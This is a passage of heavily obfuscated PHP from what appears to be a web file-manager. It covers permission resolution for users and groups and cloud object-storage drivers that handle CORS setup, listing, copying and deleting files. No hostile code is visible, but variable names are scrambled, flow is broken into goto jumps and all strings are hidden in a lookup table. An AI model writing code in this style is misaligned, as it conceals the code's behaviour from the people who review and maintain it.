$_SERVER[ì‹É]; static $f¯™Ÿ˜ùÑÔ = false; if ($f¯™Ÿ˜ùÑÔ) { return $f¯™Ÿ˜ùÑÔ; } goto B‰ƒò­°Œ—; AƒÜù¶ÎÚ–: $a±ÕÒ¼õ„¼ = array_to_keyvalue($FÖ„´Ëš, $b‚º‰º÷¥¾[33], $b‚º‰º÷¥¾[366]); $f¯™Ÿ˜ùÑÔ = array(); $FæªÄ„¹»¡ = $e§ˆ˜Šâ¸â; goto B¨®ƒÆ–ªõ; eÔñ¸ù‰²Ò: $FæªÄ„¹»¡ = array_values(array_unique($FæªÄ„¹»¡)); foreach ($FæªÄ„¹»¡ as $cÎ¤±‡÷ïŠ) { $dŒ‘Ô¤âî = $DÊİ‰ç´ø‹->getInfo($cÎ¤±‡÷ïŠ); $f¯™Ÿ˜ùÑÔ[] = $dŒ‘Ô¤âî[$b‚º‰º÷¥¾[388]][$b‚º‰º÷¥¾[366]]; } $f¯™Ÿ˜ùÑÔ = array_values(array_unique($f¯™Ÿ˜ùÑÔ)); goto AÔ¤¨ˆœç; AÔ¤¨ˆœç: return $f¯™Ÿ˜ùÑÔ; goto c’ î‚íç; B¨®ƒÆ–ªõ: $dÌì¸öË•Ú = Model($b‚º‰º÷¥¾[1083]); $DÊİ‰ç´ø‹ = Model($b‚º‰º÷¥¾[454]); if ($a±ÕÒ¼õ„¼) { $EŒæç¢½¿¹ = $dÌì¸öË•Ú->where(array($b‚º‰º÷¥¾[366] => array($b‚º‰º÷¥¾[381], $a±ÕÒ¼õ„¼)))->select(); foreach ($EŒæç¢½¿¹ as $Eœ»„šÈ¸) { $FéàÏ£Â¹é = $dÌì¸öË•Ú->parentLevelArray($Eœ»„šÈ¸[$b‚º‰º÷¥¾[455]]); $f¯™Ÿ˜ùÑÔ = array_merge($f¯™Ÿ˜ùÑÔ, $FéàÏ£Â¹é); $FæªÄ„¹»¡[] = $Eœ»„šÈ¸[$b‚º‰º÷¥¾[452]]; } } goto A› ø¹Ûƒ; B‰ƒò­°Œ—: $a…’•Ê£ªï = Model($b‚º‰º÷¥¾[2166])->listData(); $bî®ô’´ßÃ = array(); foreach ($a…’•Ê£ªï as $CÑ„ŒŒŒ) { if ($CÑ„ŒŒŒ[$b‚º‰º÷¥¾[373]] == 0 && $CÑ„ŒŒŒ[$b‚º‰º÷¥¾[2034]] == $b‚º‰º÷¥¾[84]) { $bî®ô’´ßÃ[] = $CÑ„ŒŒŒ[$b‚º‰º÷¥¾[364]]; } } goto fÅÒŒîÎ; A› ø¹Ûƒ: $FæªÄ„¹»¡ = array_values(array_unique($FæªÄ„¹»¡)); $bõ¶¤ÍõÉ– = $FæªÄ„¹»¡; foreach ($bõ¶¤ÍõÉ– as $cÎ¤±‡÷ïŠ) { $dŒ‘Ô¤âî = $DÊİ‰ç´ø‹->getInfo($cÎ¤±‡÷ïŠ); $FéàÏ£Â¹é = $dÌì¸öË•Ú->parentLevelArray($dŒ‘Ô¤âî[$b‚º‰º÷¥¾[455]]); $FæªÄ„¹»¡ = array_merge($FæªÄ„¹»¡, $FéàÏ£Â¹é); } goto eÔñ¸ù‰²Ò; c’ î‚íç: } private function makeSourceAuth($c®§¶„á‰, $A²ÔĞ‰¹à ) { goto eª’¸ê›¥»; C™®ÛäŞ„: $dğ×È®›”  = array_merge(array($c®§¶„á‰[$D‰¡Ğš÷Îƒ[366]]), array_reverse($dğ×È®›” )); $DÖ”ˆà°È = !1; foreach ($dğ×È®›”  as $E××Êò¤•–) { if (!isset($A²ÔĞ‰¹à [$E××Êò¤•–])) { continue; } $cñÌØê•â = $this->authMake($A²ÔĞ‰¹à [$E××Êò¤•–]); if ($cñÌØê•â[$D‰¡Ğš÷Îƒ[414]]) { $DÖ”ˆà°È = $cñÌØê•â; break; } } goto eîÉÀê ï; eîÉÀê ï: if (!$DÖ”ˆà°È) { $AÆî¬íù‹Û = array_to_keyvalue($AÆî¬íù‹Û, $D‰¡Ğš÷Îƒ[2014]); $eª…¡Í“÷ó = $c®§¶„á‰[$D‰¡Ğš÷Îƒ[452]]; $Fé”Éê¸¨² = isset($AÆî¬íù‹Û[$eª…¡Í“÷ó]) ? $AÆî¬íù‹Û[$eª…¡Í“÷ó] : !1; if ($Fé”Éê¸¨²) { $DÖ”ˆà°È = array($D‰¡Ğš÷Îƒ[2169] => intval($Fé”Éê¸¨²[$D‰¡Ğš÷Îƒ[373]][$D‰¡Ğš÷Îƒ[373]]), $D‰¡Ğš÷Îƒ[2170] => $Fé”Éê¸¨²[$D‰¡Ğš÷Îƒ[373]]); } } if ((!$DÖ”ˆà°È || $DÖ”ˆà°È[$D‰¡Ğš÷Îƒ[374]] <= 0) && $c®§¶„á‰[$D‰¡Ğš÷Îƒ[368]] == SourceModel::TYPE_GROUP) { $DÖ”ˆà°È = $this->authDeepCheck($c®§¶„á‰[$D‰¡Ğš÷Îƒ[366]], $DÖ”ˆà°È); } return $DÖ”ˆà°È; goto E×¼šÏ¢õ÷; eª’¸ê›¥»: $D‰¡Ğš÷Îƒ =& $_SERVER[ì‹É]; $AÆî¬íù‹Û = Session::get($D‰¡Ğš÷Îƒ[2128]); $dğ×È®›”  = Model($D‰¡Ğš÷Îƒ[1083])->parentLevelArray($c®§¶„á‰[$D‰¡Ğš÷Îƒ[455]]); goto C™®ÛäŞ„; E×¼šÏ¢õ÷: } public function authOwnerApply($EÎ¹½ª÷Ÿ) { goto a´ˆ§õâÑÜ; bº¸”‡µ†ø: if (count($a–ğá¼Ë“¼) == 0) { $a–ğá¼Ë“¼ = $this->authFolderOwnerGroup($EÎ¹½ª÷Ÿ[$e¬°î¦ÖˆÀ[452]]); } $a–ğá¼Ë“¼ = array_unique($a–ğá¼Ë“¼); if (AuthModel::authCheckRoot($EÎ¹½ª÷Ÿ[$e¬°î¦ÖˆÀ[373]][$e¬°î¦ÖˆÀ[374]])) { $a–ğá¼Ë“¼[] = USER_ID; } goto AëÕâ‡¡ÄÑ; F‡îœ—äºÆ: $B“êÆç†Õ³ = array(); $a–ğá¼Ë“¼ = array(); foreach ($cÊïóÆ°ŠÒ as $Eğ¼ßÉ•¦© => $eÇàòîµ•») { $Eì±Š„å¿¨ = $this->authFolderOwnerUser($eÇàòîµ•»); $B“êÆç†Õ³[$Eğ¼ßÉ•¦©] = $Eì±Š„å¿¨; $a–ğá¼Ë“¼ = array_merge($a–ğá¼Ë“¼, $Eì±Š„å¿¨[$e¬°î¦ÖˆÀ[527]]); if ($Eì±Š„å¿¨[$e¬°î¦ÖˆÀ[2172]]) { break; } } goto bº¸”‡µ†ø; F‡ŠáâÏ÷ø: $ağÚîŞ³„ï = Model($e¬°î¦ÖˆÀ[1083])->parentLevelArray($EÎ¹½ª÷Ÿ[$e¬°î¦ÖˆÀ[455]]); $ağÚîŞ³„ï = array_merge(array($EÎ¹½ª÷Ÿ[$e¬°î¦ÖˆÀ[366]]), array_reverse($ağÚîŞ³„ï)); $a¬Ò‹¢Ù‹ = $e¬°î¦ÖˆÀ[2163]; goto a™ã‚ÀÇÄ…; AëÕâ‡¡ÄÑ: $EÎ¹½ª÷Ÿ[$e¬°î¦ÖˆÀ[373]][$e¬°î¦ÖˆÀ[2173]] = Model($e¬°î¦ÖˆÀ[466])->userListInfo($a–ğá¼Ë“¼); return $EÎ¹½ª÷Ÿ; goto D§æ…ğ­ô; a™ã‚ÀÇÄ…: $E©ˆÏ÷Ù‰î = array($e¬°î¦ÖˆÀ[380] => array($e¬°î¦ÖˆÀ[381], $ağÚîŞ³„ï)); $cÊïóÆ°ŠÒ = $this->field($a¬Ò‹¢Ù‹)->where($E©ˆÏ÷Ù‰î)->select(); $cÊïóÆ°ŠÒ = array_to_keyvalue_group($cÊïóÆ°ŠÒ, $e¬°î¦ÖˆÀ[366]); goto F‡îœ—äºÆ; a´ˆ§õâÑÜ: $e¬°î¦ÖˆÀ =& $_SERVER[ì‹É]; if (!$EÎ¹½ª÷Ÿ[$e¬°î¦ÖˆÀ[373]] || $EÎ¹½ª÷Ÿ[$e¬°î¦ÖˆÀ[2171]]) { return $EÎ¹½ª÷Ÿ; } if (AuthModel::authCheckRoot($EÎ¹½ª÷Ÿ[$e¬°î¦ÖˆÀ[373]][$e¬°î¦ÖˆÀ[374]])) { return $EÎ¹½ª÷Ÿ; } goto F‡ŠáâÏ÷ø; D§æ…ğ­ô: } private function authFolderOwnerGroup($f•Û½´†‚‡) { $f± ’“Á¶‹ =& $_SERVER[ì‹É]; $fù›”Ò‚æ¾ = Model($f± ’“Á¶‹[2090])->where(array($f± ’“Á¶‹[2014] => $f•Û½´†‚‡))->select(); $Aì—Á©¨ = array(); if (!$fù›”Ò‚æ¾) { return $Aì—Á©¨; } foreach ($fù›”Ò‚æ¾ as $B›ÏØÚ†–ß) { $e– ÷öò = $this->authInfo($B›ÏØÚ†–ß); if (AuthModel::authCheckRoot($e– ÷öò[$f± ’“Á¶‹[373]])) { $Aì—Á©¨[] = $B›ÏØÚ†–ß[$f± ’“Á¶‹[1351]]; } } return $Aì—Á©¨; } private function authFolderOwnerUser($eÒ°ÚÜÙ) { $e·ñ³ïÔ =& $_SERVER[ì‹É]; $b©¿Î¿ŠÏí = array(); $eñˆ®²¹÷ = !1; foreach ($eÒ°ÚÜÙ as $eá¯³¶¶Ìæ) { $a•Œå‡ÙÚ = $this->authInfo($eá¯³¶¶Ìæ); if ($eá¯³¶¶Ìæ[$e·ñ³ïÔ[452]] == $e·ñ³ïÔ[464]) { $eñˆ®²¹÷ = !0; } if ($eá¯³¶¶Ìæ[$e·ñ³ïÔ[368]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($a•Œå‡ÙÚ[$e·ñ³ïÔ[373]])) { $b©¿Î¿ŠÏí[] = $eá¯³¶¶Ìæ[$e·ñ³ïÔ[452]]; } } } return array($e·ñ³ïÔ[527] => $b©¿Î¿ŠÏí, $e·ñ³ïÔ[2172] => $eñˆ®²¹÷); } public function authMake($CÄ×ÓÊÃÒŒ) { goto E‘õŠ¾Ûìá; a×ã²›Ó: $A–·Î›¢Ì‚ = 0; $E†à¤‹öÅ = 0; $C“åê¼ø¤ = 0; goto c‘Ï¹±Œ·‰; D‹Üë¡£÷Æ: $aßâö‚» = 0; $FÄíˆßà…Ö = 0; $e‘…“•¥‡ = 0; goto a×ã²›Ó; cšÃö¡¤—: $cƒİ×®ğ²© = $E†à¤‹öÅ ? $FÄíˆßà…Ö : ($C“åê¼ø¤ ? $e‘…“•¥‡ : $A–·Î›¢Ì‚); $bŠí‹ ¨ë = array($DªÚ®ùÅ[2169] => intval($e¸ï„²“‰ö), $DªÚ®ùÅ[2170] => $cƒİ×®ğ²©); return $bŠí‹ ¨ë; goto CÆ†»æ´·±; E‘õŠ¾Ûìá: $DªÚ®ùÅ =& $_SERVER[ì‹É]; if (!$CÄ×ÓÊÃÒŒ) { return array($DªÚ®ùÅ[374] => 0, $DªÚ®ùÅ[414] => !1); } $bëù££Šù = Session::get($DªÚ®ùÅ[2128]); goto Cšñ›†ëà; Cšñ›†ëà: $B»ëÙâ³± = array_to_keyvalue($bëù££Šù, $DªÚ®ùÅ[33], $DªÚ®ùÅ[2014]); $F—¯¾ˆ©êÍ = 0; $fÜäĞ¯Á¼ = 0; goto D‹Üë¡£÷Æ; c‘Ï¹±Œ·‰: $C›ªŞ¨–›› = 0; foreach ($CÄ×ÓÊÃÒŒ as $bÃ‡ªôğÒ) { $cƒİ×®ğ²© = $this->authInfo($bÃ‡ªôğÒ); $BÚÂ“Şâè = $bÃ‡ªôğÒ[$DªÚ®ùÅ[452]]; $e°èíè–æ = intval($cƒİ×®ğ²©[$DªÚ®ùÅ[373]]); if ($bÃ‡ªôğÒ[$DªÚ®ùÅ[368]] == SourceModel::TYPE_USER && $BÚÂ“Şâè == USER_ID) { $E†à¤‹öÅ = !0; $FÄíˆßà…Ö = $cƒİ×®ğ²©; $F—¯¾ˆ©êÍ = $e°èíè–æ; } else { if ($bÃ‡ªôğÒ[$DªÚ®ùÅ[368]] == SourceModel::TYPE_GROUP && in_array($BÚÂ“Şâè, $B»ëÙâ³±)) { $C“åê¼ø¤ = !0; if ($e°èíè–æ >= $fÜäĞ¯Á¼) { $fÜäĞ¯Á¼ = $e°èíè–æ; $e‘…“•¥‡ = $cƒİ×®ğ²©; } } else { if ($BÚÂ“Şâè == 0) { $C›ªŞ¨–›› = !0; $A–·Î›¢Ì‚ = $cƒİ×®ğ²©; $aßâö‚» = $e°èíè–æ; } } } } $e¸ï„²“‰ö = $E†à¤‹öÅ ? $F—¯¾ˆ©êÍ : ($C“åê¼ø¤ ? $fÜäĞ¯Á¼ : $aßâö‚»); goto cšÃö¡¤—; CÆ†»æ´·±: } public function authTargetInfoMake($CÚºñŞÕ¡) { goto DéíÀ‡Í½Ó; aë˜òÄ³„: foreach ($CÚºñŞÕ¡ as $eÎç¦«ğ¾) { if ($eÎç¦«ğ¾[$D±ÏõÇ™¬ö[368]] == SourceModel::TYPE_USER) { $D’ÅöÀˆéë[] = intval($eÎç¦«ğ¾[$D±ÏõÇ™¬ö[452]]); } else { if ($eÎç¦«ğ¾[$D±ÏõÇ™¬ö[368]] == SourceModel::TYPE_GROUP) { $dÃßÊí®•å[] = intval($eÎç¦«ğ¾[$D±ÏõÇ™¬ö[452]]); } } } if ($D’ÅöÀˆéë) { $D’ÅöÀˆéë = Model($D±ÏõÇ™¬ö[466])->userListInfo($D’ÅöÀˆéë); } if ($dÃßÊí®•å) { $Eİ®ĞŞº¯ä = array($D±ÏõÇ™¬ö[2088] => array($D±ÏõÇ™¬ö[381], $dÃßÊí®•å)); $dÃßÊí®•å = Model($D±ÏõÇ™¬ö[454])->field($D±ÏõÇ™¬ö[2101])->where($Eİ®ĞŞº¯ä)->select(); $dÃßÊí®•å = array_to_keyvalue($dÃßÊí®•å, $D±ÏõÇ™¬ö[2014]); } goto a•ä¨§¤â; a•ä¨§¤â: return array($D±ÏõÇ™¬ö[2174] => $D’ÅöÀˆéë, $D±ÏõÇ™¬ö[2175] => $dÃßÊí®•å); goto DÍÍÛŸ«¼Ñ; DéíÀ‡Í½Ó: $D±ÏõÇ™¬ö =& $_SERVER[ì‹É]; $D’ÅöÀˆéë = array(); $dÃßÊí®•å = array(); goto aë˜òÄ³„; DÍÍÛŸ«¼Ñ: } private function authInfo($FæÒåÕÖ») { $f²ÚôĞ–’– =& $_SERVER[ì‹É]; if ($FæÒåÕÖ»[$f²ÚôĞ–’–[2144]]) { $FÀášñŠ•© = Model($f²ÚôĞ–’–[2160])->listData($FæÒåÕÖ»[$f²ÚôĞ–’–[2144]]); if (!$FÀášñŠ•©) { return !1; $F¶ëµ±ƒÄ = Model($f²ÚôĞ–’–[2160])->listData(); $f¼èçÃ = array_filter_by_field($F¶ëµ±ƒÄ, $f²ÚôĞ–’–[373], $f²ÚôĞ–’–[464]); return $f¼èçÃ; } $D„ î°ê÷ = array_field_key($FÀášñŠ•©, array($f²ÚôĞ–’–[364], $f²ÚôĞ–’–[28], $f²ÚôĞ–’–[373], $f²ÚôĞ–’–[2032], $f²ÚôĞ–’–[2035])); $D„ î°ê÷[$f²ÚôĞ–’–[2176]] = $FæÒåÕÖ»; return $D„ î°ê÷; } else { return array($f²ÚôĞ–’–[382] => 0, $f²ÚôĞ–’–[2020] => $FæÒåÕÖ»[$f²ÚôĞ–’–[2145]], $f²ÚôĞ–’–[383] => $f²ÚôĞ–’–[33], $f²ÚôĞ–’–[2032] => $f²ÚôĞ–’–[2177]); } } } goto aç¦º¿½­¶; e¨áê±‡¿: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($C·£ïÁÉ) { parent::__construct($C·£ïÁÉ); $this->signatureVersion($_SERVER[ì‹É][197]); } public function fileOutLink($eÍ®Ğ¥ÛÃ¦) { $d¿„åáø« =& $_SERVER[ì‹É]; if (substr($eÍ®Ğ¥ÛÃ¦, 0, 7) == $d¿„åáø«[1081]) { $eÍ®Ğ¥ÛÃ¦ = $d¿„åáø«[1082] . substr($eÍ®Ğ¥ÛÃ¦, 7); } header($d¿„åáø«[153] . $eÍ®Ğ¥ÛÃ¦); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($dÉ²ñœá®İ) { parent::__construct(); include_once SDK_DIR . $_SERVER[ì‹É][1136]; $this->_init($dÉ²ñœá®İ); } public function _init($e×ÇŒÇ²öÚ) { foreach ($e×ÇŒÇ²öÚ as $a‹Ÿ”º®ƒ => $fĞ‚ÛÎ¹¶Å) { if (isset($this->{$a‹Ÿ”º®ƒ})) { $this->{$a‹Ÿ”º®ƒ} = $fĞ‚ÛÎ¹¶Å; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[ì‹É][1137], !1); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); } public function setBucketCors() { goto CŞ¡É´‰Û; CÆï¨ÍíĞŞ: $C•É½†î°->addRule($b×½¨½¢Ò); try { $this->client->putBucketCors($this->bucket, $C•É½†î°); } catch (OSS\Core\OssException $eãÙÛÔ¤Œå) { return !1; } return !0; goto A×—Ï­—©ğ; f„Ş­¢Ãª¢: $b×½¨½¢Ò->addAllowedMethod($B áš±¶‰’[1141]); $b×½¨½¢Ò->addAllowedMethod($B áš±¶‰’[1142]); $b×½¨½¢Ò->addAllowedMethod($B áš±¶‰’[152]); goto C×²Šè×š‹; CŞ¡É´‰Û: $B áš±¶‰’ =& $_SERVER[ì‹É]; $C•É½†î° = new OSS\Model\CorsConfig(); $b×½¨½¢Ò = new OSS\Model\CorsRule(); goto aƒ‡®á¨ù©; aƒ‡®á¨ù©: $b×½¨½¢Ò->addAllowedOrigin($B áš±¶‰’[1138]); $b×½¨½¢Ò->addAllowedMethod($B áš±¶‰’[1139]); $b×½¨½¢Ò->addAllowedMethod($B áš±¶‰’[1140]); goto f„Ş­¢Ãª¢; C×²Šè×š‹: $b×½¨½¢Ò->setMaxAgeSeconds(600); $b×½¨½¢Ò->addExposeHeader($B áš±¶‰’[1143]); $b×½¨½¢Ò->addAllowedHeader($B áš±¶‰’[1138]); goto CÆï¨ÍíĞŞ; A×—Ï­—©ğ: } public function getBucketCors() { goto eø˜ˆ”‚âÎ; B…ËŒä¢¹Í: if (!$C‰ÔÇ¢‹ÉÃ || !($Dì½Ÿ¼¿Ò‘ = $C‰ÔÇ¢‹ÉÃ->getRules())) { return null; } $Aóè¥â© = $Dì½Ÿ¼¿Ò‘[0]->getAllowedOrigins(); $Fî®æà÷Ì° = $Dì½Ÿ¼¿Ò‘[0]->getAllowedMethods(); goto eé¾Ïåêà; d…‹¬Ãé‹: return array($CÓƒœ¾àÌ¿[172] => isset($Aóè¥â©[0]) ? $Aóè¥â©[0] : $CÓƒœ¾àÌ¿[33], $CÓƒœ¾àÌ¿[176] => $Fî®æà÷Ì°, $CÓƒœ¾àÌ¿[1144] => $dµìÁò¸, $CÓƒœ¾àÌ¿[1145] => isset($dÉ÷–ĞßÛ¸[0]) ? $dÉ÷–ĞßÛ¸[0] : $CÓƒœ¾àÌ¿[33], $CÓƒœ¾àÌ¿[174] => isset($d¦™Óëâ¨Ê[0]) ? $d¦™Óëâ¨Ê[0] : $CÓƒœ¾àÌ¿[33]); goto d¾Ó½ŞÚ»; eé¾Ïåêà: $dµìÁò¸ = $Dì½Ÿ¼¿Ò‘[0]->getMaxAgeSeconds(); $dÉ÷–ĞßÛ¸ = $Dì½Ÿ¼¿Ò‘[0]->getExposeHeaders(); $d¦™Óëâ¨Ê = $Dì½Ÿ¼¿Ò‘[0]->getAllowedHeaders(); goto d…‹¬Ãé‹; eø˜ˆ”‚âÎ: $CÓƒœ¾àÌ¿ =& $_SERVER[ì‹É]; $C‰ÔÇ¢‹ÉÃ = null; try { $C‰ÔÇ¢‹ÉÃ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $EÌÄ†µù˜) { return null; } goto B…ËŒä¢¹Í; d¾Ó½ŞÚ»: } public function isBucketCors() { goto eÖ²çÃŠ–í; eÖ²çÃŠ–í: $BÏ¶Ñğè›ó =& $_SERVER[ì‹É]; $eŒÇ¢éÈ¶ = $this->getBucketCors(); if (!$eŒÇ¢éÈ¶ || !is_array($eŒÇ¢éÈ¶)) { return !1; } goto cïØê—æèŒ; cïØê—æèŒ: if ($eŒÇ¢éÈ¶[$BÏ¶Ñğè›ó[172]] != $BÏ¶Ñğè›ó[173] || $eŒÇ¢éÈ¶[$BÏ¶Ñğè›ó[174]] != $BÏ¶Ñğè›ó[173]) { return !1; } $C½ø¬Üèªì = array_map($BÏ¶Ñğè›ó[175], $eŒÇ¢éÈ¶[$BÏ¶Ñğè›ó[176]]); if (!is_array($C½ø¬Üèªì)) { $C½ø¬Üèªì = array(); } goto FËŸÖáò; FËŸÖáò: $c‡—Ñòç = array($BÏ¶Ñğè›ó[177], $BÏ¶Ñğè›ó[178], $BÏ¶Ñğè›ó[179], $BÏ¶Ñğè›ó[180], $BÏ¶Ñğè›ó[181]); $D¼ªé³Üøæ = array_diff($c‡—Ñòç, $C½ø¬Üèªì); return empty($D¼ªé³Üøæ); goto c¨Û¤ä‹‚¹; c¨Û¤ä‹‚¹: } public function mkfile($D§¯œ‘Å¶Ç, $A¢ÒÆÙˆ² = '', $e‰»ËÊİºª = REPEAT_RENAME) { $a±à÷‚ƒ‚‚ = $this->setContent($D§¯œ‘Å¶Ç, $A¢ÒÆÙˆ²); if ($a±à÷‚ƒ‚‚ !== !1) { return $this->getPathOuter($D§¯œ‘Å¶Ç); } return !1; } public function mkdir($A¯¸¼¬¯êÎ, $DéÊâ³ğâ¡ = REPEAT_SKIP) { if ($this->_isFolder($A¯¸¼¬¯êÎ)) { return $this->getPathOuter($A¯¸¼¬¯êÎ); } try { $this->client->createObjectDir($this->bucket, $A¯¸¼¬¯êÎ); } catch (OSS\Core\OssException $FØ…¥¯÷ƒ) { return !1; } return $this->getPathOuter($A¯¸¼¬¯êÎ); } private function fileList($C–ŠŒ­¿Ÿˆ, $bÓ‡‹ˆó»ë = '', $eŒ‚ÁŸÓÔ‘ = 0) { goto BàòˆîˆÙ; DÜÙÆ¢—ÖÂ: while (!0) { $CŠ‘õ¹Â¹Û = array($cÍåó²ê[1146] => $bÓ‡‹ˆó»ë, $cÍåó²ê[183] => $EßÉÖ°ÊÙ, $cÍåó²ê[1147] => $Bêñß¶·“æ, $cÍåó²ê[1148] => $bòêÔÎø¦Ö); try { $B ÚæİÙîì = $this->client->listObjects($this->bucket, $CŠ‘õ¹Â¹Û); } catch (OSS\Core\OssException $cÉëÑç²‰) { break; } $bòêÔÎø¦Ö = $B ÚæİÙîì->getNextMarker(); $BôÎ’ÌÍ’ï = $B ÚæİÙîì->getObjectList(); $A‘£ìÀäÆ‹ = $B ÚæİÙîì->getPrefixList(); foreach ($BôÎ’ÌÍ’ï as $bÔÛÖá³šö) { if ($bÔÛÖá³šö->getKey() == $EßÉÖ°ÊÙ) { continue; } $f”¤ó»à»’ = $bÔÛÖá³šö->getKey(); if ($eŒ‚ÁŸÓÔ‘) { $f”¤ó»à»’ = array($cÍåó²ê[28] => $f”¤ó»à»’, $cÍåó²ê[78] => $bÔÛÖá³šö->getSize(), $cÍåó²ê[187] => strtotime($bÔÛÖá³šö->getLastModified())); } $cŠ‘„‰¦ğë[] = $f”¤ó»à»’; } foreach ($A‘£ìÀäÆ‹ as $FÚ¸’‚†¯Ú) { $DÃõä¿Í[] = $FÚ¸’‚†¯Ú->getPrefix(); } if ($bòêÔÎø¦Ö === $cÍåó²ê[33]) { break; } } return array($cÍåó²ê[75] => $DÃõä¿Í, $cÍåó²ê[74] => $cŠ‘„‰¦ğë); goto c´Ò¹©‘ô¤; BàòˆîˆÙ: $cÍåó²ê =& $_SERVER[ì‹É]; $C–ŠŒ­¿Ÿˆ = trim($C–ŠŒ­¿Ÿˆ, $cÍåó²ê[8]); $EßÉÖ°ÊÙ = empty($C–ŠŒ­¿Ÿˆ) ? $cÍåó²ê[33] : $C–ŠŒ­¿Ÿˆ . $cÍåó²ê[8]; goto eÙ÷®»®“é; eÙ÷®»®“é: $bòêÔÎø¦Ö = $cÍåó²ê[33]; $Bêñß¶·“æ = 1000; $DÃõä¿Í = $cŠ‘„‰¦ğë = array(); goto DÜÙÆ¢—ÖÂ; c´Ò¹©‘ô¤: } public function copyFile($F™‹ó³†ÍÙ, $Dçµà©¡) { $F¬˜±«ÕÁÔ = $this->size($F™‹ó³†ÍÙ); if ($F¬˜±«ÕÁÔ < 1024 * 1024 * 1024) { try { $EíéÄƒÉ¦é = $this->client->copyObject($this->bucket, $F™‹ó³†ÍÙ, $this->bucket, $Dçµà©¡); } catch (OSS\Core\OssException $BÕÚ¼öö­¨) { return !1; } return !0; } return $this->multiCopyObject($F™‹ó³†ÍÙ, $Dçµà©¡, $F¬˜±«ÕÁÔ); } private function multiCopyObject($fšì“ÃÏ, $Déøá¹·¼, $cñÖôïåçÂ) { $fëŠ¡ï†ª =& $_SERVER[ì‹É]; try { goto d©¥ìÏêô; d×—ÑóÇŠŠ: $A­İ‹ÇœßË = $this->osChunkSize(); $a¹ôÇ—Š² = $this->client->generateMultiuploadParts($cñÖôïåçÂ, $A­İ‹ÇœßË); foreach ($a¹ôÇ—Š² as $Cªœ¢Í¿… => $Fò¯®²ìÕ˜) { $DÏÓâÅé­ = $DÏƒ¡âä®£ + (int) $Fò¯®²ìÕ˜[$fëŠ¡ï†ª[1150]]; $AÄ¯¥Û‡ö = (int) $Fò¯®²ìÕ˜[$fëŠ¡ï†ª[322]] + $DÏÓâÅé­ - 1; $Eµ²Ó–ª†¨ = array($fëŠ¡ï†ª[1151] => $DÏÓâÅé­, $fëŠ¡ï†ª[1152] => $AÄ¯¥Û‡ö); $a¡Íó„Ìˆß[] = $this->client->uploadPartCopy($this->bucket, $fšì“ÃÏ, $this->bucket, $Déøá¹·¼, $BõéœöÓŠß, $dñ’ªÇ×‘ğ, $Eµ²Ó–ª†¨); $BõéœöÓŠß = $BõéœöÓŠß + 1; } goto d»öÃì®ñ’; d©¥ìÏêô: $cñçĞ’Ö˜› = array(); if ($cÂí·® ¡Î = $this->hashMd5($fšì“ÃÏ)) { $cñçĞ’Ö˜› = array(OSS\OssClient::OSS_HEADERS => array($fëŠ¡ï†ª[1149] => $cÂí·® ¡Î)); } $dñ’ªÇ×‘ğ = $this->client->initiateMultipartUpload($this->bucket, $Déøá¹·¼, $cñçĞ’Ö˜›); goto d×æèùêò­; d»öÃì®ñ’: $Aîíµ¯‰‰ó = array(); foreach ($a¡Íó„Ìˆß as $Cªœ¢Í¿… => $A²ŒŒÁ¾à ) { $Aîíµ¯‰‰ó[] = array($fëŠ¡ï†ª[1153] => $Cªœ¢Í¿… + 1, $fëŠ¡ï†ª[1154] => $A²ŒŒÁ¾à ); } $EÆÔÛ¹Î¥ = $this->client->completeMultipartUpload($this->bucket, $Déøá¹·¼, $dñ’ªÇ×‘ğ, $Aîíµ¯‰‰ó); goto CòÈ˜‹Ì¢“; d×æèùêò­: $BõéœöÓŠß = 1; $DÏƒ¡âä®£ = 0; $a¡Íó„Ìˆß = array(); goto d×—ÑóÇŠŠ; CòÈ˜‹Ì¢“: } catch (OSS\Core\OssException $a®š†‘·—µ) { return !1; } return !0; } public function moveFile($e¼µ‘Èƒ×, $E¾©¦ïˆ) { if ($this->copyFile($e¼µ‘Èƒ×, $E¾©¦ïˆ)) { $this->remove($e¼µ‘Èƒ×); return !0; } return !1; } public function delFile($Fö‡ºµ©ˆ×) { try { $this->client->deleteObject($this->bucket, $Fö‡ºµ©ˆ×); } catch (OSS\Core\OssException $e£òá«í¬) { return !1; } return !0; } public function delFolder($Då®¡ë•ƒ) { $dÄô¬ËÆä’ =& $_SERVER[ì‹É]; $bìĞÌ—É— = $this->fileList($Då®¡ë•ƒ); if (!empty($Då®¡ë•ƒ) && !in_array(trim($Då®¡ë•ƒ, $dÄô¬ËÆä’[8]) . $dÄô¬ËÆä’[8], $bìĞÌ—É—[$dÄô¬ËÆä’[74]])) { $bìĞÌ—É—[$dÄô¬ËÆä’[74]][] = trim($Då®¡ë•ƒ, $dÄô¬ËÆä’[8]) . $dÄô¬ËÆä’[8]; } foreach (array_chunk($bìĞÌ—É—[$dÄô¬ËÆä’[74]], 1000) as $D‹ñ†è˜Óˆ) { try { $this->client->deleteObjects($this->bucket, $D‹ñ†è˜Óˆ); } catch (OSS\Core\OssException $eëÆ³š‹Â“) { continue; } } return !0; } public function rename($CÌ¹êÓÎ’, $cğƒ˜„è…) { return $this->renameObject($CÌ¹êÓÎ’, $cğƒ˜„è…); } private function fileInfo($C¨˜ÉœƒùÍ, $FİËÜ†Ü Ú = array()) { goto Fä‰ éëÜ; DåÍç‚©Á: return $BßĞóåøˆ‘; goto fğÕŠãèÊŒ; Fí´Ùêöİ¶: if (isset($FİËÜ†Ü Ú[$FáåÆƒ ©¹[78]])) { $BßĞóåøˆ‘[$FáåÆƒ ©¹[78]] = $FİËÜ†Ü Ú[$FáåÆƒ ©¹[78]]; } if (isset($FİËÜ†Ü Ú[$FáåÆƒ ©¹[108]])) { $BßĞóåøˆ‘[$FáåÆƒ ©¹[108]] = $FİËÜ†Ü Ú[$FáåÆƒ ©¹[108]]; } if (isset($FİËÜ†Ü Ú[$FáåÆƒ ©¹[187]]) && !trim($BßĞóåøˆ‘[$FáåÆƒ ©¹[108]])) { $BßĞóåøˆ‘[$FáåÆƒ ©¹[108]] = $FİËÜ†Ü Ú[$FáåÆƒ ©¹[187]]; } goto 